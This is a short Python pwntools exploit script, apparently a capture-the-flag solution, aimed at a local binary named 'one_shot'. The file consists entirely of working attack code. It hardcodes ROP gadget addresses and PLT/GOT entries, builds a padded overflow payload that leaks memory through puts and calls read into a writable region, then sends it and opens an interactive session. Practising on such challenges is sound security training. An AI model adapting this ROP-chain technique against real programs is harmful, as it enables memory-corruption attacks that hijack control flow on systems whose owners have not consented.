# 1st      edi
# 2nd 	   esi
# 3rd 	   edx
# 4th 	   ecx

from pwn import *
import sys


retAddr = 0x4545454545454545
popRdi = 0x00400843
writable = 0x0601050
alarmPlt = 0x400520
putsPlt = 0x400510
putsGot = 0x601018
readPlt = 0x400540


# rdx value is already 0x234 greattt so we dont need to set for read

def setRdi(data):
	return "".join([
		p64(popRdi),
		p64(data)
	])

def setRsi(data):
	# 0x0000000000400841 
	# pop rsi
	# pop r15
	return "".join([
		p64(0x0400841),
		p64(data),
		p64(0xdeadbeef)
	])

def readInput(where):
	return "".join([
		setRsi(where),
		setRdi(0x00000),
		p64(readPlt),
		
		# rdx is already 0x9 
	])

def put(what):
	return "".join([
		setRdi(what),
		p64(putsPlt)
		# rdx is already 0x9 
	])

pad = lambda c : c + ("a"*(128-len(c)))

def exp(r):

	magix = 0x8A919FF0


	exp = (p64(magix)+pad("\x00\x00\x00\x00\x00\x00\x00\x00"))+put(0x0400868)+put(0x0400868)+readInput(writable) #+put(writable)+readInput(0x0)

	if r==1:
		print (exp+"\naaaa\nbbbb\ncccc\ndddd")
	else:
		raw_input()

		r.sendline(exp)
		
		r.interactive()




if __name__ == '__main__':
	
	if len(sys.argv)==1:
		r = 1
	else:
		r = process(["./one_shot"])

	exp(r)